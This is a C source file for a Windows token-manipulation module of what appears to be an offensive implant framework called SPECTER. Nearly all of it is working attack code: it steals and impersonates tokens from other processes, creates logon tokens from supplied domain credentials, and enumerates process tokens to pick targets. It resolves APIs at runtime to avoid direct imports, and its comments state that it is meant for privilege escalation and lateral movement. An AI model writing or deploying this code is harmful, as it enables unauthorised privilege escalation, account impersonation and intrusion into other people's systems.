/**
 * SPECTER Module — Token Manipulation
 *
 * Provides token theft, creation, impersonation, and enumeration for
 * privilege escalation and lateral movement preparation.
 *
 * Subcommands:
 *   "steal"  <pid>             — steal token from target process
 *   "make"   <domain> <user> <pass> — create token via LogonUserW
 *   "revert"                   — revert to original token
 *   "list"                     — enumerate process tokens
 *
 * All Windows API calls go through bus->resolve() — no direct imports.
 * Token operations use bus->token_steal/token_impersonate/token_revert
 * where available, falling back to resolved APIs for enumeration.
 *
 * Build: make modules  (produces build/modules/token.bin)
 */

#include "module.h"

/* ------------------------------------------------------------------ */
/*  Inline CRT primitives (modules are standalone PIC blobs)           */
/* ------------------------------------------------------------------ */

SIZE_T spec_strlen(const char *s)
{
    SIZE_T len = 0;
    while (s[len]) len++;
    return len;
}

int spec_strcmp(const char *a, const char *b)
{
    while (*a && (*a == *b)) { a++; b++; }
    return (unsigned char)*a - (unsigned char)*b;
}

void *spec_memset(void *dst, int c, SIZE_T n)
{
    BYTE *d = (BYTE *)dst;
    while (n--) *d++ = (BYTE)c;
    return dst;
}

void *spec_memcpy(void *dst, const void *src, SIZE_T n)
{
    BYTE *d = (BYTE *)dst;
    const BYTE *s = (const BYTE *)src;
    while (n--) *d++ = *s++;
    return dst;
}

/* ------------------------------------------------------------------ */
/*  NT / Win32 constants for token operations                          */
/* ------------------------------------------------------------------ */

/* NtQuerySystemInformation classes */
#define SystemProcessInformation    5

/* Process access rights */
#define PROCESS_QUERY_INFORMATION   0x0400

/* Token access rights */
#define TOKEN_QUERY                 0x0008
#define TOKEN_DUPLICATE             0x0002
#define TOKEN_ASSIGN_PRIMARY        0x0001
#define TOKEN_IMPERSONATE           0x0004
#define TOKEN_ALL_ACCESS            0x000F01FF

/* Token information classes */
#define TokenUser                   1
#define TokenElevationType          18
#define TokenIntegrityLevel         25

/* Security impersonation level */
#define SecurityImpersonation       2

/* Token type */
#define TokenPrimary                1
#define TokenImpersonation_Type     2

/* LogonUserW logon types */
#define LOGON32_LOGON_NEW_CREDENTIALS   9
#define LOGON32_PROVIDER_WINNT50        3

/* Integrity level RIDs */
#define SECURITY_MANDATORY_UNTRUSTED_RID        0x0000
#define SECURITY_MANDATORY_LOW_RID              0x1000
#define SECURITY_MANDATORY_MEDIUM_RID           0x2000
#define SECURITY_MANDATORY_MEDIUM_PLUS_RID      0x2100
#define SECURITY_MANDATORY_HIGH_RID             0x3000
#define SECURITY_MANDATORY_SYSTEM_RID           0x4000

/* NTSTATUS codes */
#define STATUS_INFO_LENGTH_MISMATCH     ((NTSTATUS)0xC0000004)
#define STATUS_BUFFER_TOO_SMALL         ((NTSTATUS)0xC0000023)

/* Max output buffer for formatted table */
#define TOKEN_LIST_BUF_SIZE     4096
#define MAX_PROCS               512

/* ------------------------------------------------------------------ */
/*  NT structures for process/token enumeration                        */
/* ------------------------------------------------------------------ */

#pragma pack(push, 1)

typedef struct _SID_IDENTIFIER_AUTHORITY {
    BYTE Value[6];
} SID_IDENTIFIER_AUTHORITY;

typedef struct _SID {
    BYTE  Revision;
    BYTE  SubAuthorityCount;
    SID_IDENTIFIER_AUTHORITY IdentifierAuthority;
    DWORD SubAuthority[15];     /* variable length, max 15 */
} SID, *PSID;

typedef struct _SID_AND_ATTRIBUTES {
    PSID  Sid;
    DWORD Attributes;
} SID_AND_ATTRIBUTES;

typedef struct _TOKEN_USER_INFO {
    SID_AND_ATTRIBUTES User;
} TOKEN_USER_INFO;

typedef struct _TOKEN_MANDATORY_LABEL {
    SID_AND_ATTRIBUTES Label;
} TOKEN_MANDATORY_LABEL;

/* Minimal SYSTEM_PROCESS_INFORMATION for enumeration */
typedef struct _SYSTEM_PROCESS_INFO {
    DWORD           NextEntryOffset;
    DWORD           NumberOfThreads;
    BYTE            Reserved1[48];
    UNICODE_STRING  ImageName;
    LONG            BasePriority;
    HANDLE          UniqueProcessId;
    PVOID           InheritedFromUniqueProcessId;
    DWORD           HandleCount;
    DWORD           SessionId;
    /* ... more fields follow but we don't need them */
} SYSTEM_PROCESS_INFO;

#pragma pack(pop)

/* ------------------------------------------------------------------ */
/*  Function pointer typedefs for resolved APIs                        */
/* ------------------------------------------------------------------ */

typedef NTSTATUS (*FN_NtQuerySystemInformation)(
    DWORD SystemInformationClass,
    PVOID SystemInformation,
    DWORD SystemInformationLength,
    PDWORD ReturnLength
);

typedef NTSTATUS (*FN_NtOpenProcessToken)(
    HANDLE ProcessHandle,
    DWORD  DesiredAccess,
    PHANDLE TokenHandle
);

typedef NTSTATUS (*FN_NtQueryInformationToken)(
    HANDLE TokenHandle,
    DWORD  TokenInformationClass,
    PVOID  TokenInformation,
    DWORD  TokenInformationLength,
    PDWORD ReturnLength
);

typedef NTSTATUS (*FN_NtClose)(HANDLE Handle);

typedef BOOL (*FN_LookupAccountSidW)(
    PCWSTR  lpSystemName,
    PSID    Sid,
    PWCHAR  Name,
    PDWORD  cchName,
    PWCHAR  ReferencedDomainName,
    PDWORD  cchReferencedDomainName,
    PDWORD  peUse
);

typedef BOOL (*FN_LogonUserW)(
    PCWSTR  lpszUsername,
    PCWSTR  lpszDomain,
    PCWSTR  lpszPassword,
    DWORD   dwLogonType,
    DWORD   dwLogonProvider,
    PHANDLE phToken
);

typedef BOOL (*FN_CloseHandle)(HANDLE hObject);

/* ------------------------------------------------------------------ */
/*  Helper: integer to decimal string                                  */
/* ------------------------------------------------------------------ */

static DWORD uint_to_str(DWORD val, char *buf, DWORD buf_len)
{
    char tmp[16];
    DWORD i = 0, j;

    if (buf_len < 2)
        return 0;

    if (val == 0) {
        buf[0] = '0';
        buf[1] = '\0';
        return 1;
    }

    while (val > 0 && i < sizeof(tmp) - 1) {
        tmp[i++] = (char)('0' + (val % 10));
        val /= 10;
    }

    if (i >= buf_len)
        i = buf_len - 1;

    /* Reverse */
    for (j = 0; j < i; j++)
        buf[j] = tmp[i - 1 - j];
    buf[i] = '\0';

    return i;
}

/* ------------------------------------------------------------------ */
/*  Helper: append string to output buffer                             */
/* ------------------------------------------------------------------ */

static DWORD buf_append(char *buf, DWORD buf_len, DWORD offset,
                         const char *str)
{
    while (*str && offset < buf_len - 1)
        buf[offset++] = *str++;
    buf[offset] = '\0';
    return offset;
}

/* ------------------------------------------------------------------ */
/*  Helper: append integer to output buffer                            */
/* ------------------------------------------------------------------ */

static DWORD buf_append_uint(char *buf, DWORD buf_len, DWORD offset,
                              DWORD val)
{
    char tmp[16];
    uint_to_str(val, tmp, sizeof(tmp));
    return buf_append(buf, buf_len, offset, tmp);
}

/* ------------------------------------------------------------------ */
/*  Helper: convert WCHAR string to narrow (ASCII portion only)        */
/* ------------------------------------------------------------------ */

static DWORD wchar_to_narrow(const WCHAR *src, DWORD src_chars,
                              char *dst, DWORD dst_len)
{
    DWORD i;
    DWORD n = src_chars;
    if (n >= dst_len)
        n = dst_len - 1;
    for (i = 0; i < n; i++)
        dst[i] = (char)(src[i] & 0xFF);
    dst[n] = '\0';
    return n;
}

/* ------------------------------------------------------------------ */
/*  Helper: get integrity level string from RID                        */
/* ------------------------------------------------------------------ */

static const char *integrity_str(DWORD rid)
{
    if (rid >= SECURITY_MANDATORY_SYSTEM_RID)       return "System";
    if (rid >= SECURITY_MANDATORY_HIGH_RID)         return "High";
    if (rid >= SECURITY_MANDATORY_MEDIUM_PLUS_RID)  return "MedPlus";
    if (rid >= SECURITY_MANDATORY_MEDIUM_RID)       return "Medium";
    if (rid >= SECURITY_MANDATORY_LOW_RID)          return "Low";
    return "Untrusted";
}

/* ------------------------------------------------------------------ */
/*  Subcommand: steal — steal token from a process by PID              */
/* ------------------------------------------------------------------ */

static DWORD cmd_steal(MODULE_BUS_API *api, const MODULE_ARGS *args)
{
    DWORD pid;
    HANDLE token;

    /* Expect arg[1] = PID (int32) */
    pid = module_arg_int32(args, 1, 0);
    if (pid == 0) {
        MODULE_OUTPUT_ERROR(api, "token steal: missing or invalid PID");
        return MODULE_ERR_ARGS;
    }

    /* Use bus token_steal: opens process, opens token, duplicates */
    token = api->token_steal(pid);
    if (!token || token == INVALID_HANDLE_VALUE) {
        MODULE_OUTPUT_ERROR(api, "token steal: failed to steal token");
        return MODULE_ERR_ACCESS;
    }

    /* Impersonate the stolen token */
    if (!api->token_impersonate(token)) {
        MODULE_OUTPUT_ERROR(api, "token steal: impersonation failed");
        return MODULE_ERR_ACCESS;
    }

    {
        char out[64];
        DWORD off = 0;
        off = buf_append(out, sizeof(out), off, "token steal: impersonating PID ");
        off = buf_append_uint(out, sizeof(out), off, pid);
        MODULE_OUTPUT_TEXT(api, out);
    }

    return MODULE_SUCCESS;
}

/* ------------------------------------------------------------------ */
/*  Subcommand: make — create token via LogonUserW                     */
/* ------------------------------------------------------------------ */

static DWORD cmd_make(MODULE_BUS_API *api, const MODULE_ARGS *args)
{
    const char *domain;
    const char *user;
    const char *pass;
    HANDLE token;

    /* Expect arg[1]=domain, arg[2]=username, arg[3]=password (strings) */
    domain = module_arg_string(args, 1);
    user   = module_arg_string(args, 2);
    pass   = module_arg_string(args, 3);

    if (!domain || !user || !pass) {
        MODULE_OUTPUT_ERROR(api, "token make: usage: make <domain> <user> <pass>");
        return MODULE_ERR_ARGS;
    }

    /* Use bus token_make: calls LogonUserW with LOGON32_LOGON_NEW_CREDENTIALS */
    token = api->token_make(user, pass, domain);
    if (!token || token == INVALID_HANDLE_VALUE) {
        MODULE_OUTPUT_ERROR(api, "token make: LogonUserW failed");
        return MODULE_ERR_ACCESS;
    }

    /* Impersonate the new token */
    if (!api->token_impersonate(token)) {
        MODULE_OUTPUT_ERROR(api, "token make: impersonation failed");
        return MODULE_ERR_ACCESS;
    }

    {
        char out[128];
        DWORD off = 0;
        off = buf_append(out, sizeof(out), off, "token make: impersonating ");
        off = buf_append(out, sizeof(out), off, domain);
        off = buf_append(out, sizeof(out), off, "\\");
        off = buf_append(out, sizeof(out), off, user);
        MODULE_OUTPUT_TEXT(api, out);
    }

    return MODULE_SUCCESS;
}

/* ------------------------------------------------------------------ */
/*  Subcommand: revert — revert to original token                      */
/* ------------------------------------------------------------------ */

static DWORD cmd_revert(MODULE_BUS_API *api, const MODULE_ARGS *args)
{
    if (!api->token_revert()) {
        MODULE_OUTPUT_ERROR(api, "token revert: failed");
        return MODULE_ERR_ACCESS;
    }

    MODULE_OUTPUT_TEXT(api, "token revert: reverted to original token");
    return MODULE_SUCCESS;
}

/* ------------------------------------------------------------------ */
/*  Subcommand: list — enumerate process tokens                        */
/*                                                                     */
/*  Output: PID | User | Session | Integrity                           */
/*  Uses NtQuerySystemInformation + NtOpenProcessToken +               */
/*  NtQueryInformationToken + LookupAccountSidW                        */
/* ------------------------------------------------------------------ */

static DWORD cmd_list(MODULE_BUS_API *api, const MODULE_ARGS *args)
{
    FN_NtQuerySystemInformation pNtQuerySystemInformation;
    FN_NtOpenProcessToken       pNtOpenProcessToken;
    FN_NtQueryInformationToken  pNtQueryInformationToken;
    FN_NtClose                  pNtClose;
    FN_LookupAccountSidW        pLookupAccountSidW;

    BYTE *proc_buf = NULL;
    DWORD proc_buf_size;
    DWORD ret_len;
    NTSTATUS status;
    char out[TOKEN_LIST_BUF_SIZE];
    DWORD off = 0;
    DWORD proc_count = 0;

    /* Resolve required APIs */
    pNtQuerySystemInformation = (FN_NtQuerySystemInformation)
        api->resolve("ntdll.dll", "NtQuerySystemInformation");
    pNtOpenProcessToken = (FN_NtOpenProcessToken)
        api->resolve("ntdll.dll", "NtOpenProcessToken");
    pNtQueryInformationToken = (FN_NtQueryInformationToken)
        api->resolve("ntdll.dll", "NtQueryInformationToken");
    pNtClose = (FN_NtClose)
        api->resolve("ntdll.dll", "NtClose");
    pLookupAccountSidW = (FN_LookupAccountSidW)
        api->resolve("advapi32.dll", "LookupAccountSidW");

    if (!pNtQuerySystemInformation || !pNtOpenProcessToken ||
        !pNtQueryInformationToken || !pNtClose) {
        MODULE_OUTPUT_ERROR(api, "token list: failed to resolve NT APIs");
        return MODULE_ERR_RESOLVE;
    }

    /* Allocate buffer for process information */
    proc_buf_size = 1024 * 128;  /* 128 KB initial */
    proc_buf = (BYTE *)api->mem_alloc((SIZE_T)proc_buf_size, 0x04); /* PAGE_READWRITE */
    if (!proc_buf) {
        MODULE_OUTPUT_ERROR(api, "token list: memory allocation failed");
        return MODULE_ERR_ALLOC;
    }

    /* Query process list — retry with larger buffer if needed */
    ret_len = 0;
    status = pNtQuerySystemInformation(SystemProcessInformation,
                                        proc_buf, proc_buf_size, &ret_len);
    if (status == STATUS_INFO_LENGTH_MISMATCH ||
        status == STATUS_BUFFER_TOO_SMALL) {
        api->mem_free(proc_buf);
        proc_buf_size = ret_len + 4096;
        proc_buf = (BYTE *)api->mem_alloc((SIZE_T)proc_buf_size, 0x04);
        if (!proc_buf) {
            MODULE_OUTPUT_ERROR(api, "token list: realloc failed");
            return MODULE_ERR_ALLOC;
        }
        status = pNtQuerySystemInformation(SystemProcessInformation,
                                            proc_buf, proc_buf_size, &ret_len);
    }

    if (!NT_SUCCESS(status)) {
        api->mem_free(proc_buf);
        MODULE_OUTPUT_ERROR(api, "token list: NtQuerySystemInformation failed");
        return MODULE_ERR_IO;
    }

    /* Table header */
    off = buf_append(out, sizeof(out), off,
                     "PID     | User                          | Session | Integrity\n");
    off = buf_append(out, sizeof(out), off,
                     "--------|-------------------------------|---------|----------\n");

    /* Walk the process list */
    {
        SYSTEM_PROCESS_INFO *entry = (SYSTEM_PROCESS_INFO *)proc_buf;
        while (entry && proc_count < MAX_PROCS) {
            DWORD pid = (DWORD)(ULONG_PTR)entry->UniqueProcessId;
            HANDLE proc_handle;
            HANDLE token_handle = NULL;
            NTSTATUS ts;

            /* Try to open process token */
            proc_handle = api->proc_open(pid, PROCESS_QUERY_INFORMATION);
            if (proc_handle && proc_handle != INVALID_HANDLE_VALUE) {
                ts = pNtOpenProcessToken(proc_handle,
                                          TOKEN_QUERY, &token_handle);
                if (NT_SUCCESS(ts) && token_handle) {
                    /* Query token user */
                    BYTE user_buf[256];
                    DWORD user_ret = 0;
                    char username[64];
                    char domainname[64];

                    spec_memset(username, 0, sizeof(username));
                    spec_memset(domainname, 0, sizeof(domainname));

                    ts = pNtQueryInformationToken(token_handle, TokenUser,
                                                   user_buf, sizeof(user_buf),
                                                   &user_ret);
                    if (NT_SUCCESS(ts) && pLookupAccountSidW) {
                        TOKEN_USER_INFO *tui = (TOKEN_USER_INFO *)user_buf;
                        WCHAR wname[64];
                        WCHAR wdomain[64];
                        DWORD name_len = 64;
                        DWORD domain_len = 64;
                        DWORD sid_use = 0;

                        spec_memset(wname, 0, sizeof(wname));
                        spec_memset(wdomain, 0, sizeof(wdomain));

                        if (pLookupAccountSidW(NULL, tui->User.Sid,
                                                wname, &name_len,
                                                wdomain, &domain_len,
                                                &sid_use)) {
                            wchar_to_narrow(wdomain, domain_len,
                                            domainname, sizeof(domainname));
                            wchar_to_narrow(wname, name_len,
                                            username, sizeof(username));
                        }
                    }

                    /* Query integrity level */
                    {
                        BYTE il_buf[128];
                        DWORD il_ret = 0;
                        const char *il_str = "?";

                        ts = pNtQueryInformationToken(token_handle,
                                                       TokenIntegrityLevel,
                                                       il_buf, sizeof(il_buf),
                                                       &il_ret);
                        if (NT_SUCCESS(ts)) {
                            TOKEN_MANDATORY_LABEL *tml =
                                (TOKEN_MANDATORY_LABEL *)il_buf;
                            PSID label_sid = tml->Label.Sid;
                            if (label_sid) {
                                SID *sid = (SID *)label_sid;
                                if (sid->SubAuthorityCount > 0) {
                                    DWORD rid = sid->SubAuthority[
                                        sid->SubAuthorityCount - 1];
                                    il_str = integrity_str(rid);
                                }
                            }
                        }

                        /* Format: PID | DOMAIN\User | Session | Integrity */
                        {
                            char pid_str[12];
                            DWORD pad;

                            uint_to_str(pid, pid_str, sizeof(pid_str));
                            off = buf_append(out, sizeof(out), off, pid_str);
                            /* Pad PID to 8 chars */
                            pad = spec_strlen(pid_str);
                            while (pad < 8 && off < sizeof(out) - 1) {
                                out[off++] = ' ';
                                pad++;
                            }
                            off = buf_append(out, sizeof(out), off, "| ");

                            /* Domain\User (pad to 30) */
                            if (domainname[0]) {
                                off = buf_append(out, sizeof(out), off, domainname);
                                off = buf_append(out, sizeof(out), off, "\\");
                            }
                            off = buf_append(out, sizeof(out), off, username);
                            {
                                DWORD user_col = spec_strlen(domainname);
                                if (domainname[0]) user_col += 1; /* backslash */
                                user_col += spec_strlen(username);
                                while (user_col < 30 && off < sizeof(out) - 1) {
                                    out[off++] = ' ';
                                    user_col++;
                                }
                            }
                            off = buf_append(out, sizeof(out), off, "| ");

                            /* Session */
                            off = buf_append_uint(out, sizeof(out), off,
                                                   entry->SessionId);
                            {
                                char sess_str[12];
                                DWORD sess_pad;
                                uint_to_str(entry->SessionId, sess_str,
                                            sizeof(sess_str));
                                sess_pad = spec_strlen(sess_str);
                                while (sess_pad < 8 && off < sizeof(out) - 1) {
                                    out[off++] = ' ';
                                    sess_pad++;
                                }
                            }
                            off = buf_append(out, sizeof(out), off, "| ");

                            /* Integrity */
                            off = buf_append(out, sizeof(out), off, il_str);
                            off = buf_append(out, sizeof(out), off, "\n");
                        }
                    }

                    pNtClose(token_handle);
                }
                api->proc_close(proc_handle);
            }

            proc_count++;

            /* Advance to next entry */
            if (entry->NextEntryOffset == 0)
                break;
            entry = (SYSTEM_PROCESS_INFO *)((BYTE *)entry +
                                             entry->NextEntryOffset);
        }
    }

    api->mem_free(proc_buf);

    /* Output the table */
    out[sizeof(out) - 1] = '\0';
    MODULE_OUTPUT_TEXT(api, out);

    return MODULE_SUCCESS;
}

/* ------------------------------------------------------------------ */
/*  Module entry point                                                 */
/* ------------------------------------------------------------------ */

DWORD module_entry(MODULE_BUS_API *api, BYTE *args_raw, DWORD args_len)
{
    MODULE_ARGS  args;
    const char  *subcmd;

    if (!module_parse_args(args_raw, args_len, &args)) {
        MODULE_OUTPUT_ERROR(api, "token: failed to parse arguments");
        return MODULE_ERR_ARGS;
    }

    subcmd = module_arg_string(&args, 0);
    if (!subcmd) {
        MODULE_OUTPUT_ERROR(api, "token: missing subcommand (steal|make|revert|list)");
        return MODULE_ERR_ARGS;
    }

    if (spec_strcmp(subcmd, "steal") == 0)
        return cmd_steal(api, &args);

    if (spec_strcmp(subcmd, "make") == 0)
        return cmd_make(api, &args);

    if (spec_strcmp(subcmd, "revert") == 0)
        return cmd_revert(api, &args);

    if (spec_strcmp(subcmd, "list") == 0)
        return cmd_list(api, &args);

    MODULE_OUTPUT_ERROR(api, "token: unknown subcommand");
    return MODULE_ERR_UNSUPPORTED;
}
